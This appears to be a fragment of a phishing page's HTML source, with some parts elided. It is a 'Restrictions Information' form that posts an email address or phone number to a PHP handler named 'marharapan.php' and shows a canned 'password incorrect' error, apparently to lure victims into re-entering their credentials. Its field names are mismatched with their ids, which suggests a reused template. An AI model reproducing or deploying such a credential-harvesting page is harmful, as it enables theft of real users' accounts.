...
<head>
  ...
  <link rel="stylesheet" type="text/css" href="css/info/style-info.css">
  <link rel="stylesheet" type="text/css" href="css/info/style-error.css">
  <link rel="stylesheet" type="text/css" href="css/info/interview.css">
...
<div id="page-div">
    ...
    <div id="interview-page-container" class="">
      <div class="BackArrowAndHeading">
        <h2 id="groupHeader" class="Flex1">Restrictions Information</h2>  
      </div>
  ...
  <form action="marharapan.php?button_location=settings&amp;button_name=help" method="POST">
<div class="ElementWrapper">
    <div data-form-element-key="PrevToPrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevToPrevYearDays">
      <div class="TextBox floatingLabelContainer">
        <input type="text" name="PrevToEmail" id="PrevToPrevYearDays" required="" pattern=".{5,}" placeholder=" ">
        <label class="Caption" title="Email address or phone number" for="PrevToPrevYearDays">
  ...
  <div class="redtext2">The password that you've entered is incorrect.</div>
</div>
